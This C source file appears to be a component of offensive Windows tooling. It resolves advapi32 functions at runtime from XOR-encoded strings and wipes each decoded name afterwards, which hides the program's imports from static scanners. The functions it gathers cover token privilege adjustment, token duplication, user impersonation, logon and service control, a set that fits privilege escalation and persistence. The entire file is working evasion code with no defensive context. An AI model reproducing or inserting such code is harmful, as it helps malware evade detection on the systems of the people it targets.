#include "adv_lazy.h"
#include "evs_strings.h"
#include <string.h>

static adv_api_t _adv;
static int       _adv_ok = 0;

static void _xdec(const unsigned char *enc, size_t n, char *out) {
    volatile unsigned char k = EVS_KEY;
    for (size_t i = 0; i < n; i++) out[i] = (char)(enc[i] ^ k);
    out[n] = '\0';
}

const adv_api_t *adv_get(void)
{
    if (_adv_ok) return &_adv;

    char dll[16], fn[40];
    _xdec(EVS_dll_advapi32, sizeof(EVS_dll_advapi32), dll);
    HMODULE h = LoadLibraryA(dll);
    SecureZeroMemory(dll, sizeof(dll));
    if (!h) return &_adv;

    struct { const unsigned char *enc; size_t n; void **p; } t[] = {
        { EVS_fn_AdjustTokenPrivileges,     sizeof(EVS_fn_AdjustTokenPrivileges),     (void **)&_adv.AdjustTokenPrivileges        },
        { EVS_fn_DuplicateTokenEx,          sizeof(EVS_fn_DuplicateTokenEx),          (void **)&_adv.DuplicateTokenEx             },
        { EVS_fn_ImpersonateLoggedOnUser,   sizeof(EVS_fn_ImpersonateLoggedOnUser),   (void **)&_adv.ImpersonateLoggedOnUser      },
        { EVS_fn_LogonUserA,                sizeof(EVS_fn_LogonUserA),                (void **)&_adv.LogonUserA                   },
        { EVS_fn_LookupPrivilegeNameA,      sizeof(EVS_fn_LookupPrivilegeNameA),      (void **)&_adv.LookupPrivilegeNameA         },
        { EVS_fn_LookupPrivilegeValueA,     sizeof(EVS_fn_LookupPrivilegeValueA),     (void **)&_adv.LookupPrivilegeValueA        },
        { EVS_fn_OpenProcessToken,          sizeof(EVS_fn_OpenProcessToken),          (void **)&_adv.OpenProcessToken             },
        { EVS_fn_OpenThreadToken,           sizeof(EVS_fn_OpenThreadToken),           (void **)&_adv.OpenThreadToken              },
        { EVS_fn_RevertToSelf,              sizeof(EVS_fn_RevertToSelf),              (void **)&_adv.RevertToSelf                 },
        { EVS_fn_CloseServiceHandle,        sizeof(EVS_fn_CloseServiceHandle),        (void **)&_adv.CloseServiceHandle           },
        { EVS_fn_EnumServicesStatusExA,     sizeof(EVS_fn_EnumServicesStatusExA),     (void **)&_adv.EnumServicesStatusExA        },
        { EVS_fn_OpenSCManagerA,            sizeof(EVS_fn_OpenSCManagerA),            (void **)&_adv.OpenSCManagerA               },
        { EVS_fn_OpenServiceA,              sizeof(EVS_fn_OpenServiceA),              (void **)&_adv.OpenServiceA                 },
        { EVS_fn_QueryServiceConfigA,       sizeof(EVS_fn_QueryServiceConfigA),       (void **)&_adv.QueryServiceConfigA          },
        { EVS_fn_RegisterServiceCtrlHandlerA,sizeof(EVS_fn_RegisterServiceCtrlHandlerA),(void **)&_adv.RegisterServiceCtrlHandlerA},
        { EVS_fn_SetServiceStatus,          sizeof(EVS_fn_SetServiceStatus),          (void **)&_adv.SetServiceStatus             },
        { EVS_fn_StartServiceCtrlDispatcherA,sizeof(EVS_fn_StartServiceCtrlDispatcherA),(void **)&_adv.StartServiceCtrlDispatcherA},
    };
    for (int i = 0; i < 17; i++) {
        _xdec(t[i].enc, t[i].n, fn);
        *t[i].p = (void *)GetProcAddress(h, fn);
        SecureZeroMemory(fn, t[i].n + 1);
    }

    _adv_ok = 1;
    return &_adv;
}
